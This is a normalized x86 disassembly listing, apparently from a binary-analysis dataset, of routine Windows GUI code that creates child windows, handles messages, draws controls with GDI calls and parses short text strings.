mov ecx [ rw-data ]
mov eax [ rw-data ]
add ecx 0x70
cmp eax 0x2
jne r-xdata
push eax
call j_sub_4b692d
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x10 ]
mov eax [ eax + ecx ]
mov ebp [ esp + 0x10 ]
mov eax edx
sub eax [ ecx + ebp ]
inc eax
jmp r-xdata
mov edx [ esp + 0x28 ]
push edx
add ecx 0x2
push ecx
mov ecx [ esp + 0x28 ]
push ecx
push eax
push edi
call [ Rectangle@IAT ]
mov edx [ esp + 0x14 ]
push edx
push edi
call ebx
mov eax [ esp + 0x34 ]
mov ebp [ DeleteObject@IAT ]
push eax
call ebp
mov ecx [ esp + 0x38 ]
push ecx
push edi
call ebx
mov edx [ esp + 0x18 ]
push edx
call ebp
push edi
push esi
call [ ReleaseDC@IAT ]
sub eax 0x2
add ecx 0x2
mov al [ esi ]
cmp al 0x30
jl r-xdata
cmp esi [ rw-data ]
jne r-xdata
mov ecx [ esp + 0x1c ]
add ecx 0x3
jmp r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x6c ]
push edx
push 0x0
push 0x404
push eax
call esi
mov eax [ esp + 0x1b4 ]
mov ecx [ esp + 0x2c ]
mov edx [ rw-data ]
push 0x0
shr eax 0x10
push 0x3
shl eax 0x10
or eax ecx
mov ecx [ esp + 0x1b8 ]
push 0x403
push edx
mov [ esp + 0x1c4 ] eax
mov [ esp + 0x68 ] eax
mov [ esp + 0x64 ] ecx
mov [ esp + 0x60 ] 0x200
mov [ esp + 0x5c ] ebp
call esi
mov eax [ rw-data ]
push 0x7fff
push 0x2
push 0x403
push eax
call esi
mov edx [ rw-data ]
lea ecx [ esp + 0x4c ]
push ecx
push 0x0
push 0x407
push edx
call esi
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x41d
push eax
call esi
test edi edi
mov ecx [ rw-data ]
jne r-xdata
call sub_41f020
call sub_41f020
mov ecx eax
mov eax [ rw-data ]
sub eax ecx
inc eax
jmp r-xdata
cmp eax edx
jne r-xdata
mov ebp [ esp + 0x1c ]
add ebp 0x3
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp al 0x3a
je r-xdata
cmp al 0x39
jg r-xdata
mov edx [ esp + 0x1a8 ]
push 0x0
lea ecx [ esi - 0x2 ]
push ecx
push 0x40f
push edx
call ebp
mov ecx eax
mov ecx [ esp + 0x24 ]
add ecx 0xfffffffc
jmp r-xdata
mov eax [ esp + 0x10 ]
sub eax ecx
mov ecx [ esp + 0x14 ]
add eax 0x2
cdq
xor eax edx
sub eax edx
cmp eax ecx
jge r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esp + 0x1c ]
add eax 0x3
jmp r-xdata
cmp eax 0x1
jne r-xdata
push 0x0
add eax 0xfffffffe
push eax
push 0x40f
push esi
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
mov ebp eax
mov ebp [ esp + 0x24 ]
add ebp 0xfffffffc
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov al [ esi ]
test al al
je r-xdata
cmp al 0x2f
je r-xdata
lea edx [ ecx + ecx * 4 ]
movsx ecx al
lea ecx [ ecx + edx * 2 - 0x30 ]
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x2c ]
inc ecx
mov [ esp + 0x18 ] ecx
add eax 0x20
jmp r-xdata
mov [ esp + 0x14 ] eax
mov edi 0xffff
mov ebx esi
push 0x0
add eax 0xfffffffe
push eax
push 0x40f
push esi
call ebp
mov eax [ esp + 0x24 ]
add eax 0xfffffffc
jmp r-xdata
lea edx [ eax - 0x3 ]
mov [ esp + 0x4c ] eax
mov ecx 0x13
add eax 0x3
push 0xff
mov [ esp + 0x54 ] 0xa
mov [ esp + 0x58 ] edx
mov [ esp + 0x5c ] ecx
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] ecx
mov [ esp + 0x40 ] 0x3
call [ CreateSolidBrush@IAT ]
mov ebp eax
push ebp
push edi
call ebx
push 0x1
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0x54 ]
push ecx
push edi
call [ PolyPolygon@IAT ]
mov edx [ esp + 0x14 ]
push edx
push edi
call ebx
push ebp
call [ DeleteObject@IAT ]
push edi
push esi
call [ ReleaseDC@IAT ]
mov edx [ rw-data ]
mov eax [ esp + 0x10 ]
inc edx
cmp edx [ eax + ecx ]
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edx + ecx ]
mov edx [ rw-data ]
inc edx
cmp edx eax
jg r-xdata
lea ecx [ esp + 0x4c ]
call sub_4607d0
mov edi edi
test al al
je r-xdata
xor al 0x20
add al 0x5f
cmp al 0x3b
mov [ esp + 0x4c ] ecx
ja r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov [ esp + 0x2c ] eax
jne r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
push ecx
jmp r-xdata
mov edx [ rw-data ]
inc edx
cmp edx eax
jl r-xdata
cmp [ esi ] 0x0
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
xor ecx ecx
inc esi
jmp r-xdata
add esi 0x2
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
push edi
call ebx
push 0x16
lea eax [ ebp + 0x2 ]
push eax
push 0x2
add ebp 0xfffffffe
push ebp
push edi
call [ Rectangle@IAT ]
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x10 ]
inc ecx
add eax 0x20
mov [ esp + 0x2c ] ecx
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
cmp ecx eax
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
cmp al 0x3a
je r-xdata
mov eax [ esp + 0x34 ]
push eax
jmp r-xdata
mov edx [ esp + 0x14 ]
jmp r-xdata
lea eax [ esp + 0x4c ]
push eax
mov ecx rw-data
call sub_47af80
cmp [ esp + 0x68 ] 0x10
mov [ esp + 0x1a0 ] ebp
jb r-xdata
lea esp [ esp ]
push edx
cmp [ esi ] 0x0
mov [ esp + 0x68 ] ebx
mov [ esp + 0x64 ] edi
mov [ esp + 0x54 ] 0x0
jne r-xdata
mov ecx [ esp + 0x54 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp al 0x3c
je r-xdata
mov [ esp + 0x68 ] ebx
mov [ esp + 0x64 ] edi
mov [ esp + 0x54 ] 0x0
xor ecx ecx
mov [ esp + 0x1a0 ] edi
mov [ esp + 0x4c ] ecx
jmp r-xdata
jmp r-xdata
cmp al 0x3e
je r-xdata
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
cmp al 0x5c
jne r-xdata
mov [ esp + 0x3c ] al
mov eax [ esp + 0x3c ]
push eax
push 0x1
lea ecx [ esp + 0x58 ]
call sub_4017f0
jmp r-xdata
mov cl [ esi ]
mov [ esp + 0x14 ] cl
mov edx [ esp + 0x14 ]
push edx
push 0x1
lea ecx [ esp + 0x58 ]
call sub_4017f0
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x7c
je r-xdata
inc esi
cmp al 0x7c
je r-xdata
cmp al 0x3c
je r-xdata
cmp al 0x3e
je r-xdata
cmp al 0x5c
jne r-xdata
sub_494d20
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1656
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x178
cmp eax 0x4e
push ebx
push ebp
mov ebp [ esp + 0x190 ]
push esi
mov esi [ esp + 0x1a0 ]
push edi
ja r-xdata
cmp eax 0x401
ja r-xdata
je r-xdata
cmp eax 0x40a
jne r-xdata
je r-xdata
mov ebx [ GetWindowLongA@IAT ]
push 0xffffffeb
push ebp
call ebx
cmp [ esi ] eax
mov eax [ esi + 0x8 ]
jne r-xdata
dec eax
cmp eax 0x2a
ja r-xdata
mov ecx [ esp + 0x1a4 ]
mov edx [ esp + 0x1a0 ]
mov eax [ esp + 0x19c ]
push ecx
push edx
push eax
push ebp
call [ DefWindowProcA@IAT ]
mov ecx [ esp + 0x188 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x184
retn 0x10
xor eax eax
push 0xffffffeb
mov ecx 0xb
lea edi [ esp + 0x48 ]
[ edi ]
push ebp
mov [ esp + 0x4c ] 0x2c
mov [ esp + 0x50 ] 0x11
mov [ esp + 0x54 ] ebp
call [ GetWindowLongA@IAT ]
mov ebx [ SendMessageA@IAT ]
mov [ esp + 0x18 ] eax
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov edi edi
push 0xfffffffa
push ebp
call [ GetWindowLongA@IAT ]
mov edi eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
sub eax 0x111
je r-xdata
cmp eax 0xfffffdf8
jne r-xdata
cmp eax 0xfffffdf8
jne r-xdata
movzx eax [ eax + lookup_table_495be0 ]
jmp [ eax * 4 + jump_table_495bc8 ]
test esi esi
je r-xdata
mov ecx [ eax * 4 + rw-data ]
test ecx ecx
jl r-xdata
push 0x0
mov ebx [ CreateWindowExA@IAT ]
push edi
push 0x0
push ebp
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0x1
push r--data
push r--data
push 0x0
call ebx
mov esi eax
push esi
push 0xffffffeb
push ebp
call [ SetWindowLongA@IAT ]
push 0x0
push edi
push 0x65
push ebp
push 0x12
push 0x16
push 0x0
push 0x0
push 0x50800802
push r--data
push r--data
push 0x0
mov [ rw-data ] esi
call ebx
push 0x0
push 0x11
call [ GetStockObject@IAT ]
push eax
push 0x30
push 0x65
push ebp
call [ GetDlgItem@IAT ]
mov esi [ SendMessageA@IAT ]
push eax
call esi
push 0x0
push 0x0
push 0x40a
push ebp
call esi
jmp r-xdata
push 0x104
lea ecx [ esp + 0x88 ]
push ecx
push 0x0
mov [ esp + 0x90 ] 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x84 ]
push edx
call sub_457f40
add esp 0x4
mov [ esp + eax + 0x84 ] 0x0
push r--data
lea eax [ esp + 0x88 ]
push eax
call [ lstrcatA@IAT ]
push 0x1010
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x94 ]
push ecx
push edi
call [ LoadImageA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov ecx [ esp + 0x1a0 ]
cmp cx 0xa
jb r-xdata
sub eax 0x3
jne r-xdata
push 0x64
push ebp
call [ GetDlgItem@IAT ]
mov ecx [ esp + 0x1a4 ]
mov edi eax
cmp [ ecx + 0x4 ] edi
jne r-xdata
xor edi edi
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] edi
mov [ esp + 0x20 ] 0x0
push 0x64
push ebp
mov [ esp + 0x198 ] edi
call [ GetDlgItem@IAT ]
mov ecx [ esp + 0x1a4 ]
mov esi eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
push 0x0
push 0x0
push 0x401
push ebp
call [ PostMessageA@IAT ]
jmp r-xdata
mov edi [ esp + 0x1a4 ]
mov eax [ edi + 0x10 ]
test al 0x1
je r-xdata
cmp [ rw-data ] ebp
jne r-xdata
mov eax [ rw-data ]
mov edi [ GetDlgItem@IAT ]
xor ebx ebx
xor esi esi
test eax eax
jle r-xdata
lea edx [ esp + 0x44 ]
push edx
push ebp
call [ BeginPaint@IAT ]
mov edi [ GetSysColor@IAT ]
push 0x14
mov esi eax
call edi
mov ebx [ CreatePen@IAT ]
push eax
push 0x1
push 0x0
call ebx
push 0x10
mov [ esp + 0x44 ] eax
call edi
push eax
push 0x1
push 0x0
call ebx
mov edi [ SelectObject@IAT ]
push eax
push esi
mov [ esp + 0x1c ] eax
call edi
mov [ esp + 0x38 ] eax
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x18 ] 0x0
jle r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
inc eax
add edx 0x12
cmp eax 0x20
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] edx
jl r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x44 ]
push eax
push 0x0
push 0x405
push ecx
test esi esi
je r-xdata
test esi esi
jne r-xdata
push ebp
call [ GetDC@IAT ]
mov esi eax
push esi
call [ CreateCompatibleDC@IAT ]
push esi
push ebp
mov [ rw-data ] eax
call [ ReleaseDC@IAT ]
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push eax
call [ SelectObject@IAT ]
cmp cx 0x65
jne r-xdata
mov edx [ rw-data ]
mov edi [ rw-data ]
movzx eax cx
lea edx [ edi + edx + 0x9 ]
cmp eax edx
jg r-xdata
mov eax [ esp + 0x1a0 ]
cmp ax 0x5
jne r-xdata
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x400
push edi
call ebx
push 0x0
push 0x0
push 0x402
push edi
mov esi eax
call ebx
cmp [ rw-data ] 0x2
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
xor esi esi
test edx edx
jle r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
test al 0x10
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx esi [ esp + 0x1a4 ]
dec ecx
test ecx ecx
mov [ esp + 0x14 ] ecx
jl r-xdata
jmp r-xdata
lea ecx [ esp + 0x1c ]
push ecx
push ebp
call [ GetClientRect@IAT ]
mov ebx [ esp + 0x24 ]
mov edx [ esp + 0x1c ]
mov eax [ rw-data ]
sub ebx edx
dec eax
test eax eax
mov [ esp + 0x18 ] eax
jl r-xdata
mov ecx [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x2
mov ebx 0x1
jmp r-xdata
mov edi [ esp + 0x10 ]
add edi 0xa
push edi
push ebp
call [ GetDlgItem@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi eax
mov eax [ esp + 0x10 ]
add edx ecx
cmp eax edx
jge r-xdata
mov eax [ rw-data ]
test eax eax
push 0x64
push ebp
je r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x44 ]
push ecx
push 0x0
push 0x405
push edx
jmp r-xdata
push esi
push 0xfffffffa
push ebp
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x18 ]
push eax
push edi
push ebp
push 0x12
push 0x12
push 0x1
push ecx
push 0x5000000b
push r--data
push r--data
push esi
call [ CreateWindowExA@IAT ]
push sub_458550
mov esi eax
push 0xfffffffc
push esi
call [ SetWindowLongA@IAT ]
lea edx [ esp + 0x44 ]
push edx
push 0x0
mov [ rw-data ] eax
mov eax [ esp + 0x20 ]
push 0x404
push eax
mov [ esp + 0x60 ] esi
mov [ esp + 0x78 ] 0xffffffff
call ebx
jmp r-xdata
cmp cx 0x69
jne r-xdata
shr ecx 0x10
cmp ecx 0x100
jne r-xdata
mov ecx [ rw-data ]
mov edx [ eax * 4 + rw-data ]
push ecx
push 0x1
push edx
call sub_48a5f0
add esp 0xc
call [ GetFocus@IAT ]
cmp eax esi
jne r-xdata
cmp ax 0x4
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
push esi
lea edx [ esp + 0x88 ]
push r--data
push edx
mov [ esp + 0x19c ] 0x1
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ esp + 0x84 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_402510
test esi esi
jle r-xdata
sub eax esi
inc eax
mov esi eax
mov eax [ esp + 0x34 ]
mov esi 0x10
cmp eax esi
mov eax [ esp + 0x20 ]
jae r-xdata
lea eax [ esi + 0xa ]
push eax
push ebp
call [ GetDlgItem@IAT ]
mov ecx [ esp + 0x1a4 ]
cmp [ ecx + 0x4 ] eax
jne r-xdata
push edi
push edi
mov edi [ SendMessageA@IAT ]
push 0x400
push esi
call edi
mov [ esp + 0x14 ] eax
cmp [ rw-data ] 0x2
jne r-xdata
xor ebx ebx
cmp eax 0x2
jne r-xdata
mov ecx [ rw-data ]
cmp ecx [ edi + 0x14 ]
jne r-xdata
mov eax [ rw-data ]
mov edx [ edi + 0x18 ]
dec eax
neg eax
sbb eax eax
and eax 0xffffc200
add eax 0x4010
push eax
push 0x4
lea ecx [ edi + 0x1c ]
push ecx
mov ebx 0x1
push edx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ DeleteDC@IAT ]
push 0x65
push ebp
call [ GetDlgItem@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push eax
mov [ esp + 0x1c ] eax
call [ GetWindowRect@IAT ]
mov edi [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
sub edi ecx
test eax eax
je r-xdata
lea ecx [ ecx ]
mov eax [ esi * 4 + rw-data ]
test eax eax
jl r-xdata
mov eax [ esp + 0x38 ]
push eax
push esi
call edi
mov ecx [ esp + 0x40 ]
mov esi [ DeleteObject@IAT ]
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
lea eax [ esp + 0x44 ]
push eax
push ebp
call [ EndPaint@IAT ]
jmp r-xdata
lea edx [ ebx + 0x2 ]
mov [ esp + 0x10 ] edx
inc ebx
mov eax [ ecx * 4 + rw-data ]
cmp eax 0xfffffffe
jne r-xdata
call [ GetDlgItem@IAT ]
test eax eax
je r-xdata
call [ GetDlgItem@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov [ esp + 0x60 ] esi
call ebx
push esi
call [ DestroyWindow@IAT ]
mov eax [ esp + 0x1a0 ]
shr eax 0x10
cmp eax 0x200
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
jmp r-xdata
mov edi 0x10
mov ecx rw-data
call sub_4010f0
cmp esi eax
jg r-xdata
mov edx [ esp + 0x1a4 ]
push 0x50
push eax
add edx 0x10
push edx
call [ lstrcpynA@IAT ]
cmp [ esp + 0x34 ] esi
jb r-xdata
lea eax [ esp + 0x20 ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
inc esi
add ecx eax
cmp esi ecx
jl r-xdata
mov edx [ esi * 4 + rw-data ]
mov edx [ edx * 4 + rw-data ]
mov eax edx
lea edi [ eax + 0x1 ]
jmp r-xdata
push 0x0
push 0x0
push 0x402
push esi
call edi
mov esi eax
mov eax [ rw-data ]
push 0xffffffeb
push eax
call ebx
mov ecx [ eax + 0x40 ]
add eax 0x28
cmp ecx 0x10
jb r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
sub edx ecx
inc edx
mov [ esp + 0x14 ] edx
cmp eax 0x1
jne r-xdata
mov edx [ edi + 0x18 ]
push 0x10
lea ecx [ edi + 0x1c ]
push ecx
push edx
call [ FillRect@IAT ]
jmp r-xdata
call [ GetCapture@IAT ]
cmp eax [ edi + 0x14 ]
jne r-xdata
call [ DrawFrameControl@IAT ]
push eax
call [ DeleteObject@IAT ]
jmp r-xdata
push 0x64
push ebp
call [ GetDlgItem@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x14 ]
push 0x1
sub edx eax
push edx
push edi
mov eax esi
sub eax edi
push 0x2
sub eax 0x8
push eax
push ecx
call [ MoveWindow@IAT ]
sub esi 0x4
push 0x5
push 0x0
push 0x0
push 0x2
sub esi 0x12
push esi
push 0x0
add eax 0xa
push eax
push ebp
call edi
push eax
call [ SetWindowPos@IAT ]
mov ecx [ esp + 0x14 ]
jmp r-xdata
add ebx 0x4
push 0x5
push 0x0
push 0x0
push 0x2
push ebx
push 0x0
lea edx [ esi + 0xa ]
push edx
push ebp
call edi
push eax
call [ SetWindowPos@IAT ]
add ebx 0x12
jmp r-xdata
test eax eax
mov eax [ esp + 0x10 ]
jl r-xdata
sub [ esp + 0x10 ] 0x4
mov edx [ esp + 0x14 ]
push edx
push esi
sub ebx 0x4
call edi
push 0x0
push 0x2
push ebx
push esi
call [ MoveToEx@IAT ]
push 0x14
push ebx
push esi
call [ LineTo@IAT ]
mov eax [ esp + 0x40 ]
push eax
push esi
call edi
mov ecx [ esp + 0x10 ]
push 0x0
push 0x2
push ecx
push esi
call [ MoveToEx@IAT ]
mov edx [ esp + 0x10 ]
push 0x14
push edx
push esi
call [ LineTo@IAT ]
jmp r-xdata
test eax eax
jl r-xdata
mov eax [ esp + 0x14 ]
push eax
push esi
call edi
push 0x0
push 0x2
push ebx
push esi
call [ MoveToEx@IAT ]
push 0x14
push ebx
push esi
call [ LineTo@IAT ]
mov ecx [ esp + 0x40 ]
push ecx
push esi
call edi
mov edx [ esp + 0x10 ]
push 0x0
push 0x2
push edx
push esi
call [ MoveToEx@IAT ]
mov eax [ esp + 0x10 ]
push 0x14
push eax
push esi
call [ LineTo@IAT ]
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x1c ]
push edx
push ebp
call [ GetClientRect@IAT ]
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
mov edi [ esp + 0x1c ]
sub eax ecx
movzx ecx ax
sub edx edi
movzx eax dx
shl ecx 0x10
or ecx eax
push ecx
push 0x0
push 0x5
push ebp
call ebx
push 0x1
push 0x0
push ebp
call [ InvalidateRect@IAT ]
push 0x0
push eax
push 0x5
push esi
jmp r-xdata
push eax
push 0xfffffffa
push ebp
call [ GetWindowLongA@IAT ]
push eax
push 0x64
push ebp
push esi
push esi
push esi
push esi
push 0x48000141
push r--data
push r--data
push esi
call [ CreateWindowExA@IAT ]
push sub_493e90
mov esi eax
push 0xfffffffc
push esi
call [ SetWindowLongA@IAT ]
lea edx [ esp + 0x44 ]
push edx
push 0x0
mov [ rw-data ] eax
mov eax [ esp + 0x20 ]
push 0x404
push eax
mov [ esp + 0x60 ] esi
mov [ esp + 0x78 ] 0xffffffff
call ebx
test esi esi
je r-xdata
push 0x5
push 0x65
push ebp
call [ GetDlgItem@IAT ]
push eax
call [ ShowWindow@IAT ]
push 0x1
push 0x0
push 0x69
push ebp
call [ GetDlgItemInt@IAT ]
mov esi eax
dec esi
jns r-xdata
mov ecx [ rw-data ]
inc ecx
push ecx
lea edx [ esp + 0x88 ]
push r--data
push edx
call [ wsprintfA@IAT ]
mov esi [ esp + 0x1b0 ]
add esp 0xc
lea eax [ esp + 0x1c ]
push eax
push esi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x38 ]
push eax
push ebp
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] edx
call [ ScreenToClient@IAT ]
push 0x0
push esi
call [ ShowWindow@IAT ]
push 0x0
push 0xfffffffa
push ebp
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
push eax
mov eax [ esp + 0x24 ]
push 0x69
push ebp
sub ecx esi
push ecx
mov ecx [ esp + 0x4c ]
sub edx eax
mov eax [ esp + 0x50 ]
push edx
push eax
push ecx
push 0x50802002
lea edx [ esp + 0xa8 ]
push edx
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
push sub_4586b0
mov esi eax
push 0xfffffffc
push esi
call [ SetWindowLongA@IAT ]
push 0x0
push 0x11
mov [ rw-data ] eax
call [ GetStockObject@IAT ]
mov edi [ SendMessageA@IAT ]
push eax
push 0x30
push esi
call edi
push esi
call [ SetFocus@IAT ]
push 0xffffffff
push 0x0
push 0xb1
push esi
call edi
jmp r-xdata
shr eax 0x10
dec eax
mov ecx eax
mov eax [ rw-data ]
shr ecx 0x10
sub eax ecx
jmp r-xdata
mov edx [ esp + 0x1a4 ]
push 0x50
push eax
add edx 0x10
push edx
call [ lstrcpynA@IAT ]
lea ecx [ esp + 0x1c ]
call sub_4480e0
jmp r-xdata
lea eax [ esp + 0x20 ]
push r--data
lea ecx [ esp + 0x20 ]
call sub_402010
imul esi esi 0x70
mov ecx [ rw-data ]
lea eax [ esi + ecx - 0x70 ]
mov ecx [ eax + 0x18 ]
mov edi 0x10
cmp ecx edi
jb r-xdata
mov eax [ esp + 0x20 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ eax + 0x4 ]
mov edi [ eax + 0x4 ]
jmp r-xdata
test eax eax
mov eax 0x10
je r-xdata
mov eax 0x4010
jmp r-xdata
mov edx [ edi + 0x14 ]
push edx
call [ GetDlgCtrlID@IAT ]
mov ecx [ eax * 4 + rw-data ]
cmp ecx 0xa6
jne r-xdata
mov eax [ rw-data ]
mov eax [ edi + 0x18 ]
push 0x1010
push 0x4
lea edx [ edi + 0x1c ]
push edx
xor ebx ebx
push eax
jmp r-xdata
mov eax ecx
cdq
and edx 0xf
add eax edx
mov esi 0x10
sar eax 0x4
sub esi ebx
shl eax 0x4
inc ebx
and ecx 0x8000000f
push 0xcc0020
push eax
jns r-xdata
mov eax [ rw-data ]
cmp eax 0x6
ja r-xdata
push 0x1
sub esi edi
push 0x14
sub esi ebx
sub esi 0x8
push esi
push 0x0
push ebx
push eax
call [ MoveWindow@IAT ]
jmp r-xdata
mov eax [ rw-data ]
add eax ecx
mov edx [ eax * 4 + rw-data ]
test edx edx
jl r-xdata
dec ecx
mov [ esp + 0x14 ] ecx
jns r-xdata
mov eax [ rw-data ]
inc esi
cmp esi eax
jl r-xdata
sub ebx 0x4
sub eax 0x4
sub ebx 0x12
sub eax 0x12
jmp r-xdata
dec [ esp + 0x18 ]
jns r-xdata
mov eax [ esp + 0x10 ]
add ebx 0x4
add eax 0x4
mov eax [ esp + 0x10 ]
add ebx 0x12
add eax 0x12
jmp r-xdata
call [ ShowWindow@IAT ]
push 0x1
push esi
call [ EnableWindow@IAT ]
push 0x0
push 0xe
push 0x41b
push esi
call ebx
movzx ecx [ rw-data ]
shl ecx 0x10
or ecx 0x1
push ecx
push 0x1
push 0x406
push esi
call ebx
mov eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
cmp esi eax
jl r-xdata
xor esi esi
sub eax ecx
xor edx edx
test eax eax
setg dl
push 0x1
push 0x0
push ebp
lea edx [ edx + edx - 0x1 ]
push edx
push eax
call sub_4719b0
mov eax [ rw-data ]
add esp 0x14
push eax
call [ UpdateWindow@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
sub eax edi
push eax
push edx
lea ecx [ esp + 0x24 ]
call sub_401e80
mov ecx [ esp + 0x14 ]
push esi
push ecx
lea edx [ esp + 0x8c ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x10
lea eax [ esp + 0x84 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_402510
mov ecx rw-data
call sub_4010f0
test eax eax
jbe r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_402510
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x18 ]
push eax
push 0x4
lea eax [ edi + 0x1c ]
push eax
push ecx
mov eax [ esp + 0x38 ]
mov eax [ rw-data ]
shl ecx 0x4
push ecx
mov ecx [ edi + 0x18 ]
push eax
push esi
push esi
push ebx
push ebx
push ecx
call [ BitBlt@IAT ]
jmp r-xdata
dec ecx
or ecx 0xfffffff0
inc ecx
mov ecx 0x17
jmp [ eax * 4 + jump_table_495c0c ]
mov eax [ rw-data ]
mov ecx [ esp + 0x18 ]
add ecx eax
mov eax [ ecx * 4 + rw-data ]
cmp eax 0xfffffffe
jne r-xdata
mov [ esp + 0x10 ] eax
mov [ esp + 0x10 ] eax
mov eax [ rw-data ]
inc ecx
cmp ecx eax
mov [ esp + 0x18 ] ecx
jl r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov ecx [ esp + 0x1a4 ]
push ecx
call [ DestroyWindow@IAT ]
mov eax [ rw-data ]
cmp eax esi
je r-xdata
lea esi [ eax - 0x1 ]
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ eax + 0x18 ] edi
jb r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_402010
push edi
call sub_457f90
add esp 0x4
add eax edi
push eax
lea ecx [ esp + 0x20 ]
call sub_402010
jmp r-xdata
mov ecx 0x18
jmp r-xdata
mov ecx 0x19
jmp r-xdata
mov ecx 0x1a
jmp r-xdata
mov ecx 0x47
jmp r-xdata
mov ecx 0x1b
jmp r-xdata
mov ecx 0x69
jmp r-xdata
mov [ rw-data ] esi
sub esi eax
xor edx edx
test esi esi
setg dl
push 0x1
push 0x0
push ebp
lea edx [ edx + edx - 0x1 ]
push edx
push esi
call sub_4719b0
mov eax [ rw-data ]
add esp 0x14
push eax
call [ UpdateWindow@IAT ]
jmp r-xdata
cmp [ esp + 0x34 ] edi
mov eax [ esp + 0x20 ]
jae r-xdata
push eax
call sub_457f90
add esp 0x4
add eax esi
push eax
lea ecx [ esp + 0x20 ]
call sub_402010
jmp r-xdata
sub_495c30
sub esp 0x30
push ebp
mov ebp [ GetWindowLongA@IAT ]
push esi
mov esi [ esp + 0x3c ]
push edi
push 0xfffffffa
push esi
call ebp
xor edi edi
push 0x7f00
push edi
mov [ esp + 0x28 ] eax
mov [ esp + 0x3c ] r--data
